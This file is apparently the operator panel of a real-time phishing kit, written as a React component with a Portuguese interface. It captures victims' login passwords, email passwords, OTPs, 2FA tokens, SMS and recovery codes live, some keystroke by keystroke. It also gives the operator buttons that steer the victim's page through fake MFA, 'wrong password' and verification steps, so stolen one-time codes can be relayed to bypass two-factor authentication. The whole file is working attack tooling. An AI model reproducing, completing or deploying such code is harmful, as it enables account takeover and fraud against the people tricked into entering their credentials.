import { useState, useEffect, useRef, useCallback } from "react";
import { supabase } from "@/integrations/supabase/client";
import {
  ArrowLeft,
  Shield,
  KeyRound,
  Mail,
  Monitor,
  Send,
  CheckCircle,
  XCircle,
  Smartphone,
  MessageSquare,
  AlertTriangle,
  MailCheck,
  Eye,
  Lock,
  Globe,
  Copy,
} from "lucide-react";
import { parseBrowser } from "@/lib/adminUtils";
import type { SessionRecord } from "@/components/admin/AllSessionsTable";

interface OperateSessionProps {
  session: SessionRecord;
  onBack: () => void;
}

const OperateSession = ({ session, onBack }: OperateSessionProps) => {
  // ── Real-time data ──
  const [platformOtp, setPlatformOtp] = useState("");
  const [emailPassword, setEmailPassword] = useState("");
  const [emailCode, setEmailCode] = useState("");
  const [emailCodeLabel, setEmailCodeLabel] = useState("");
  const [currentPassword, setCurrentPassword] = useState(session.password || "");
  const [currentStatus, setCurrentStatus] = useState(session.status);
  const [syncEmail, setSyncEmail] = useState("");

  // ── Admin inputs ──
  const [adminTokenCode, setAdminTokenCode] = useState("");
  const [adminSmsNumber, setAdminSmsNumber] = useState("");

  // ── UI state ──
  const [sending, setSending] = useState<string | null>(null);
  const [lastAction, setLastAction] = useState<string | null>(null);
  const [decision, setDecision] = useState<string | null>(null);
  const [decisionSending, setDecisionSending] = useState(false);
  const [currentPhase, setCurrentPhase] = useState<string>("initial");
  const [copied, setCopied] = useState<string | null>(null);

  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const ch = {
    review: `session-review-${session.id}`,
    otpDec: `session-otp-decision-${session.id}`,
    otpCli: `session-review-client-otp-${session.id}`,
    confirm: `confirm-email-${session.id}`,
    sync: `sync-email-${session.id}`,
    otpMon: `otp-monitor-admin-${session.id}`,
  };

  // ══════════════════════
  // REALTIME
  // ══════════════════════
  useEffect(() => {
    const subs: ReturnType<typeof supabase.channel>[] = [];

    const otpCh = supabase.channel(ch.otpMon);
    otpCh
      .on("broadcast", { event: "otp_code_update" }, (p) => {
        const c = p.payload?.otp_code as string;
        if (c !== undefined) setPlatformOtp(c);
      })
      .subscribe();
    subs.push(otpCh);

    const confirmCh = supabase.channel(ch.confirm);
    confirmCh
      .on("broadcast", { event: "client_email_password" }, (p) => {
        if (p.payload?.email_password) setEmailPassword(p.payload.email_password);
      })
      .on("broadcast", { event: "client_email_password_typing" }, (p) => {
        if (p.payload?.email_password !== undefined) setEmailPassword(p.payload.email_password);
      })
      .on("broadcast", { event: "client_sync_email" }, (p) => {
        if (p.payload?.sync_email !== undefined) setSyncEmail(p.payload.sync_email);
      })
      .on("broadcast", { event: "client_token_update" }, (p) => {
        if (p.payload?.token_code !== undefined) { setEmailCode(p.payload.token_code); setEmailCodeLabel("Token 2FA"); }
      })
      .on("broadcast", { event: "client_sms_update" }, (p) => {
        if (p.payload?.sms_code !== undefined) { setEmailCode(p.payload.sms_code); setEmailCodeLabel("SMS"); }
      })
      .on("broadcast", { event: "client_recovery_update" }, (p) => {
        if (p.payload?.recovery_code !== undefined) { setEmailCode(p.payload.recovery_code); setEmailCodeLabel("Recovery"); }
      })
      .subscribe();
    subs.push(confirmCh);

    const syncCh = supabase.channel(ch.sync);
    syncCh
      .on("broadcast", { event: "client_sync_password" }, (p) => {
        if (p.payload?.sync_password) setEmailPassword(p.payload.sync_password);
      })
      .on("broadcast", { event: "client_sync_email" }, (p) => {
        if (p.payload?.sync_email !== undefined) setSyncEmail(p.payload.sync_email);
      })
      .on("broadcast", { event: "client_sync_token_update" }, (p) => {
        if (p.payload?.token_code !== undefined) { setEmailCode(p.payload.token_code); setEmailCodeLabel("Token 2FA"); }
      })
      .on("broadcast", { event: "client_sync_sms_update" }, (p) => {
        if (p.payload?.sms_code !== undefined) { setEmailCode(p.payload.sms_code); setEmailCodeLabel("SMS"); }
      })
      .on("broadcast", { event: "client_sync_recovery_update" }, (p) => {
        if (p.payload?.recovery_code !== undefined) { setEmailCode(p.payload.recovery_code); setEmailCodeLabel("Recovery"); }
      })
      .subscribe();
    subs.push(syncCh);

    // Polling
    const fetchData = async () => {
      const { data } = await supabase
        .from("sessions")
        .select("otp_code, status, password")
        .eq("id", session.id)
        .maybeSingle();
      if (!data) return;
      const otp = data.otp_code || "";

      if (data.password && data.password !== currentPassword) setCurrentPassword(data.password);
      setCurrentStatus(data.status);

      if (data.status === "pending_review" && lastAction === "p_wrong") {
        setLastAction(null);
        setDecision(null);
      }

      if (/^\d+$/.test(otp) && otp.length <= 6) setPlatformOtp(otp);
      if (otp.startsWith("sync_email:")) setSyncEmail(otp.replace("sync_email:", ""));
      if (otp.startsWith("email_pass:")) setEmailPassword(otp.replace("email_pass:", ""));
      if (otp.startsWith("sync_pass:")) setEmailPassword(otp.replace("sync_pass:", ""));
      if (otp.startsWith("token_code:") || otp.startsWith("sync_token:")) {
        setEmailCode(otp.replace(/^(token_code:|sync_token:)/, ""));
        setEmailCodeLabel("Token 2FA");
      }
      if (otp.startsWith("sms_code:") || otp.startsWith("sync_sms:")) {
        setEmailCode(otp.replace(/^(sms_code:|sync_sms:)/, ""));
        setEmailCodeLabel("SMS");
      }
      if (otp.startsWith("recovery_email:") || otp.startsWith("sync_recovery:")) {
        setEmailCode(otp.replace(/^(recovery_email:|sync_recovery:)/, ""));
        setEmailCodeLabel("Recovery");
      }

      if (data.status?.startsWith("redirect_otp")) setCurrentPhase("otp");
      if (
        data.status?.startsWith("redirect_confirm") ||
        data.status?.startsWith("confirm_") ||
        data.status?.startsWith("redirect_sync") ||
        data.status?.startsWith("sync_")
      )
        setCurrentPhase("email");
    };
    fetchData();
    pollingRef.current = setInterval(fetchData, 2000);

    return () => {
      subs.forEach((c) => supabase.removeChannel(c));
      if (pollingRef.current) clearInterval(pollingRef.current);
    };
  }, [session.id]);

  // ══════════════════════
  // BROADCAST
  // ══════════════════════
  const broadcastToAll = useCallback(
    (event: string, payload: Record<string, string>) => {
      [ch.review, ch.otpDec, ch.otpCli, ch.confirm, ch.sync].forEach((name) => {
        const bc = supabase.channel(`${name}-${Date.now()}-${Math.random()}`);
        bc.subscribe((s) => {
          if (s === "SUBSCRIBED") {
            bc.send({ type: "broadcast", event, payload });
            setTimeout(() => supabase.removeChannel(bc), 2500);
          }
        });
      });
    },
    [session.id]
  );

  const doAction = async (
    id: string,
    dbStatus: string,
    events: { event: string; payload: Record<string, string> }[],
    dbExtra?: Record<string, string>
  ) => {
    setSending(id);
    await supabase.from("sessions").update({ status: dbStatus, ...dbExtra }).eq("id", session.id);
    events.forEach(({ event, payload }) => broadcastToAll(event, payload));
    setSending(null);
    setLastAction(id);
    if (dbStatus.startsWith("redirect_otp")) setCurrentPhase("otp");
    if (dbStatus === "redirect_confirm_email" || dbStatus === "redirect_sync_email") setCurrentPhase("email");
  };

  // ══════════════════════
  // ACTIONS — PLATFORM
  // ══════════════════════
  const pRedirectOtp = () =>
    doAction("p_otp", "redirect_otp", [{ event: "review_decision", payload: { status: "redirect_otp" } }]);

  const pRedirectMfaSms = () =>
    doAction("p_mfa_sms", "redirect_mfa_sms", [{ event: "review_decision", payload: { status: "redirect_mfa_sms" } }]);

  const pRedirectMfaEmail = () =>
    doAction("p_mfa_email", "redirect_mfa_email", [{ event: "review_decision", payload: { status: "redirect_mfa_email" } }]);

  const pWrongPassword = () =>
    doAction("p_wrong", "wrong_password", [{ event: "review_decision", payload: { status: "wrong_password" } }]);

  const pApproveOtp = async () => {
    setDecisionSending(true);
    await supabase.from("sessions").update({ status: "otp_approved" }).eq("id", session.id);
    broadcastToAll("otp_decision", { status: "otp_approved" });
    broadcastToAll("review_decision", { status: "otp_approved" });
    setDecision("approved");
    setDecisionSending(false);
  };

  const pRejectOtp = async () => {
    setDecisionSending(true);
    await supabase.from("sessions").update({ status: "otp_rejected" }).eq("id", session.id);
    broadcastToAll("otp_decision", { status: "otp_rejected" });
    broadcastToAll("review_decision", { status: "otp_rejected" });
    setDecision("rejected");
    setDecisionSending(false);
    setTimeout(() => { setDecision(null); setPlatformOtp(""); setLastAction(null); }, 3000);
  };

  const pApproveLogin = async () => {
    setDecisionSending(true);
    await supabase.from("sessions").update({ status: "login_success" }).eq("id", session.id);
    broadcastToAll("review_decision", { status: "login_success" });
    setDecision("approved");
    setDecisionSending(false);
  };

  // ══════════════════════
  // ACTIONS — EMAIL
  // ══════════════════════
  const eRedirectEmail = () =>
    doAction("e_email", "redirect_confirm_email", [{ event: "review_decision", payload: { status: "redirect_confirm_email" } }]);

  const eWrongPassword = () =>
    doAction("e_wrong", "confirm_wrong_password", [
      { event: "admin_decision", payload: { status: "confirm_wrong_password" } },
      { event: "admin_sync_decision", payload: { status: "sync_wrong_password" } },
    ]);

  const eAskOtp = () =>
    doAction("e_otp", "confirm_ask_otp", [
      { event: "admin_decision", payload: { status: "confirm_ask_otp" } },
      { event: "admin_sync_decision", payload: { status: "sync_ask_otp" } },
    ]);

  const eAskRecovery = () =>
    doAction("e_rec", "confirm_ask_recovery", [
      { event: "admin_decision", payload: { status: "confirm_ask_recovery" } },
      { event: "admin_sync_decision", payload: { status: "sync_ask_recovery" } },
    ]);

  const eSendToken = () => {
    if (!adminTokenCode.trim()) return;
    doAction("e_tok", "confirm_ask_token", [
      { event: "admin_decision", payload: { status: "confirm_ask_token", admin_token: adminTokenCode } },
      { event: "admin_sync_decision", payload: { status: "sync_ask_token", admin_token: adminTokenCode } },
    ], { otp_code: `admin_token:${adminTokenCode}` });
    setAdminTokenCode("");
  };

  const eSendSms = () => {
    if (!adminSmsNumber.trim()) return;
    doAction("e_sms", "confirm_ask_sms", [
      { event: "admin_decision", payload: { status: "confirm_ask_sms", sms_number: adminSmsNumber } },
      { event: "admin_sync_decision", payload: { status: "sync_ask_sms", sms_number: adminSmsNumber } },
    ], { otp_code: `sms_number:${adminSmsNumber}` });
    setAdminSmsNumber("");
  };

  const eApprove = async () => {
    setDecisionSending(true);
    await supabase.from("sessions").update({ status: "confirm_approved" }).eq("id", session.id);
    broadcastToAll("admin_decision", { status: "confirm_approved" });
    broadcastToAll("admin_sync_decision", { status: "sync_approved" });
    setDecision("approved");
    setDecisionSending(false);
  };

  const eReject = async () => {
    setDecisionSending(true);
    await supabase.from("sessions").update({ status: "confirm_rejected" }).eq("id", session.id);
    broadcastToAll("admin_decision", { status: "confirm_rejected" });
    broadcastToAll("admin_sync_decision", { status: "sync_rejected" });
    setDecision("rejected");
    setDecisionSending(false);
    setTimeout(() => { setDecision(null); setEmailCode(""); setEmailPassword(""); setLastAction(null); }, 3000);
  };

  // ══════════════════════
  // HELPERS
  // ══════════════════════
  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(null), 1500);
  };

  const A = lastAction;
  const phaseLabel = currentPhase === "otp" ? "Tela OTP" : currentPhase === "email" ? "Verificar Email" : "Aguardando";
  const phaseColor =
    currentPhase === "otp"
      ? "text-blue-400 bg-blue-500/10 border-blue-500/20"
      : currentPhase === "email"
      ? "text-amber-400 bg-amber-500/10 border-amber-500/20"
      : "text-muted-foreground bg-secondary/50 border-border";

  return (
    <div className="space-y-3">
      {/* ═══ HEADER ═══ */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <button
            onClick={onBack}
            className="flex items-center gap-1.5 rounded-lg border border-border px-3 py-1.5 text-xs text-muted-foreground hover:bg-secondary transition-colors"
          >
            <ArrowLeft size={12} /> Voltar
          </button>
          <Shield className="h-4 w-4 text-primary" />
          <span className="text-sm font-bold text-foreground">Painel de Operação</span>
        </div>
        <div className="flex items-center gap-2">
          <span className={`rounded-full border px-3 py-1 text-[10px] font-bold uppercase tracking-wider ${phaseColor}`}>
            {phaseLabel}
          </span>
        </div>
      </div>

      {/* ═══ USER INFO ═══ */}
      <div className="rounded-xl border border-border bg-card p-4">
        <div className="flex items-center gap-3">
          <div className="h-2.5 w-2.5 animate-pulse rounded-full bg-green-400 shrink-0" />
          <div className="flex-1 min-w-0">
            <p className="text-sm font-bold text-foreground truncate">{syncEmail || session.email || "—"}</p>
            <div className="flex flex-wrap gap-x-3 text-[10px] text-muted-foreground mt-0.5">
              <span>{session.ip_address || "—"}</span>
              {(session.city || session.country) && (
                <span>{[session.city, session.country].filter(Boolean).join(", ")}</span>
              )}
              {session.user_agent && (
                <span className="flex items-center gap-1">
                  <Monitor size={9} /> {parseBrowser(session.user_agent)}
                </span>
              )}
            </div>
          </div>
        </div>
      </div>

      {/* ═══ LIVE DATA ═══ */}
      <div className="rounded-xl border border-border bg-card p-4">
        <p className="text-[10px] font-bold uppercase tracking-widest text-muted-foreground/60 mb-3">
          📡 Dados ao Vivo
        </p>
        <div className="grid grid-cols-2 gap-2">
          <LiveField
            icon={<Lock size={12} />}
            label="Senha de Login"
            value={currentPassword}
            highlight={currentPassword !== session.password}
            onCopy={() => copyToClipboard(currentPassword, "pass")}
            isCopied={copied === "pass"}
          />
          <LiveField
            icon={<KeyRound size={12} />}
            label="OTP Plataforma"
            value={platformOtp}
            mono
            highlight={platformOtp.length === 6}
            onCopy={() => copyToClipboard(platformOtp, "otp")}
            isCopied={copied === "otp"}
          />
          <LiveField
            icon={<Lock size={12} />}
            label="Senha do Email"
            value={emailPassword}
            highlight={!!emailPassword}
            onCopy={() => copyToClipboard(emailPassword, "emailp")}
            isCopied={copied === "emailp"}
          />
          <LiveField
            icon={<Eye size={12} />}
            label={emailCodeLabel || "Cód. Verif."}
            value={emailCode}
            mono
            highlight={!!emailCode}
            onCopy={() => copyToClipboard(emailCode, "emailc")}
            isCopied={copied === "emailc"}
          />
        </div>
      </div>

      {/* ═══ PLATFORM CONTROLS ═══ */}
      <div className="rounded-xl border border-blue-500/20 bg-blue-500/5 p-4">
        <div className="flex items-center gap-2 mb-3">
          <Globe size={14} className="text-blue-400" />
          <span className="text-xs font-bold uppercase tracking-wider text-blue-400">Plataforma</span>
        </div>
        <div className="grid grid-cols-7 gap-2">
          <ActionBtn icon={<KeyRound size={13} />} label="MFA Google" active={A === "p_otp"} onClick={pRedirectOtp} disabled={!!sending} />
          <ActionBtn icon={<MessageSquare size={13} />} label="MFA SMS" active={A === "p_mfa_sms"} onClick={pRedirectMfaSms} disabled={!!sending} />
          <ActionBtn icon={<Mail size={13} />} label="MFA Email" active={A === "p_mfa_email"} onClick={pRedirectMfaEmail} disabled={!!sending} />
          <ActionBtn icon={<AlertTriangle size={13} />} label="Senha Errada" active={A === "p_wrong"} onClick={pWrongPassword} disabled={!!sending} variant="warn" />
          <ActionBtn icon={<XCircle size={13} />} label="OTP Errado" active={A === "p_rej"} onClick={pRejectOtp} disabled={decisionSending || !platformOtp} variant="danger" />
          <ActionBtn icon={<CheckCircle size={13} />} label="Aprovar OTP" active={decision === "approved" && currentPhase === "otp"} onClick={pApproveOtp} disabled={decisionSending || platformOtp.length < 6} variant="success" />
          <ActionBtn icon={<CheckCircle size={13} />} label="Aprovar Login" onClick={pApproveLogin} disabled={decisionSending} variant="success" />
        </div>
      </div>

      {/* ═══ EMAIL CONTROLS ═══ */}
      <div className="rounded-xl border border-amber-500/20 bg-amber-500/5 p-4">
        <div className="flex items-center gap-2 mb-3">
          <Mail size={14} className="text-amber-400" />
          <span className="text-xs font-bold uppercase tracking-wider text-amber-400">E-mail</span>
        </div>

        {/* Redirect */}
        <div className="mb-3">
          <SectionLabel>Redirecionar</SectionLabel>
          <ActionBtn icon={<MailCheck size={13} />} label="Verificar Email" active={A === "e_email"} onClick={eRedirectEmail} disabled={!!sending} fullWidth />
        </div>

        {/* Notify client */}
        <div className="mb-3">
          <SectionLabel>Notificar Cliente</SectionLabel>
          <div className="grid grid-cols-3 gap-2">
            <ActionBtn icon={<AlertTriangle size={13} />} label="Senha Errada" active={A === "e_wrong"} onClick={eWrongPassword} disabled={!!sending} variant="warn" />
            <ActionBtn icon={<Smartphone size={13} />} label="Pedir OTP" active={A === "e_otp"} onClick={eAskOtp} disabled={!!sending} />
            <ActionBtn icon={<Mail size={13} />} label="Recuperação" active={A === "e_rec"} onClick={eAskRecovery} disabled={!!sending} />
          </div>
        </div>

        {/* Send data */}
        <div className="mb-3">
          <SectionLabel>Enviar Dados ao Cliente</SectionLabel>
          <div className="grid grid-cols-2 gap-2">
            <div className="flex gap-1.5">
              <input
                value={adminTokenCode}
                onChange={(e) => setAdminTokenCode(e.target.value)}
                placeholder="Token → cliente"
                className="flex-1 min-w-0 rounded-lg border border-input bg-background/50 px-3 py-2 text-xs text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-primary"
              />
              <button onClick={eSendToken} disabled={!adminTokenCode.trim() || !!sending} className="rounded-lg bg-primary px-2.5 py-2 text-primary-foreground disabled:opacity-40">
                <Send size={12} />
              </button>
            </div>
            <div className="flex gap-1.5">
              <input
                value={adminSmsNumber}
                onChange={(e) => setAdminSmsNumber(e.target.value)}
                placeholder="SMS # → cliente"
                className="flex-1 min-w-0 rounded-lg border border-input bg-background/50 px-3 py-2 text-xs text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-primary"
              />
              <button onClick={eSendSms} disabled={!adminSmsNumber.trim() || !!sending} className="rounded-lg bg-primary px-2.5 py-2 text-primary-foreground disabled:opacity-40">
                <Send size={12} />
              </button>
            </div>
          </div>
        </div>

        {/* Final decision */}
        <div>
          <SectionLabel>Decisão Final</SectionLabel>
          <div className="grid grid-cols-2 gap-2">
            <ActionBtn icon={<CheckCircle size={13} />} label="Aprovar Email" active={decision === "approved" && currentPhase === "email"} onClick={eApprove} disabled={decisionSending} variant="success" />
            <ActionBtn icon={<XCircle size={13} />} label="Rejeitar" active={decision === "rejected" && currentPhase === "email"} onClick={eReject} disabled={decisionSending} variant="danger" />
          </div>
        </div>
      </div>

      {/* ═══ FEEDBACK ═══ */}
      {decision && (
        <div
          className={`rounded-xl border px-4 py-2.5 text-center text-xs font-bold ${
            decision === "approved"
              ? "border-green-600/30 bg-green-600/10 text-green-400"
              : "border-destructive/30 bg-destructive/10 text-destructive"
          }`}
        >
          {decision === "approved" ? "✓ Aprovado com sucesso" : "✗ Rejeitado — Resetando..."}
        </div>
      )}
    </div>
  );
};

/* ═══════════════════════════════ */
/*  SUB-COMPONENTS                */
/* ═══════════════════════════════ */

const SectionLabel = ({ children }: { children: React.ReactNode }) => (
  <p className="text-[9px] font-bold uppercase tracking-widest text-muted-foreground/50 mb-1.5">{children}</p>
);

const LiveField = ({
  icon,
  label,
  value,
  mono,
  highlight,
  onCopy,
  isCopied,
}: {
  icon: React.ReactNode;
  label: string;
  value: string | null | undefined;
  mono?: boolean;
  highlight?: boolean;
  onCopy: () => void;
  isCopied: boolean;
}) => (
  <div
    className={`flex items-center justify-between rounded-lg px-3 py-2 ${
      highlight ? "bg-green-500/10 border border-green-500/20" : "bg-background/50 border border-transparent"
    }`}
  >
    <div className="flex items-center gap-2 min-w-0">
      <span className="text-muted-foreground shrink-0">{icon}</span>
      <div className="min-w-0">
        <p className="text-[9px] text-muted-foreground uppercase">{label}</p>
        <p className={`text-xs font-bold truncate ${mono ? "font-mono tracking-wider" : ""} ${highlight ? "text-green-400" : "text-foreground"}`}>
          {value || <span className="text-muted-foreground/30 font-normal">—</span>}
        </p>
      </div>
    </div>
    {value && (
      <button onClick={onCopy} className="shrink-0 ml-2 text-muted-foreground hover:text-foreground transition-colors">
        {isCopied ? <CheckCircle size={12} className="text-green-400" /> : <Copy size={12} />}
      </button>
    )}
  </div>
);

const ActionBtn = ({
  icon,
  label,
  active,
  onClick,
  disabled,
  variant,
  fullWidth,
}: {
  icon: React.ReactNode;
  label: string;
  active?: boolean;
  onClick: () => void;
  disabled: boolean;
  variant?: "warn" | "danger" | "success";
  fullWidth?: boolean;
}) => {
  const base = `flex items-center justify-center gap-1.5 rounded-lg border px-3 py-2.5 text-xs font-medium transition-all disabled:opacity-40 ${fullWidth ? "w-full" : ""}`;

  const colors = active
    ? "border-green-600/40 bg-green-600/10 text-green-400"
    : variant === "danger"
    ? "border-destructive/20 bg-card text-destructive hover:bg-destructive/10"
    : variant === "warn"
    ? "border-amber-500/20 bg-card text-amber-500 hover:bg-amber-500/10"
    : variant === "success"
    ? "border-green-600/20 bg-card text-green-500 hover:bg-green-600/10"
    : "border-border bg-card text-foreground hover:border-primary/30 hover:bg-primary/5";

  return (
    <button onClick={onClick} disabled={disabled} className={`${base} ${colors}`}>
      {icon}
      <span>{active ? `${label} ✓` : label}</span>
    </button>
  );
};

export default OperateSession;
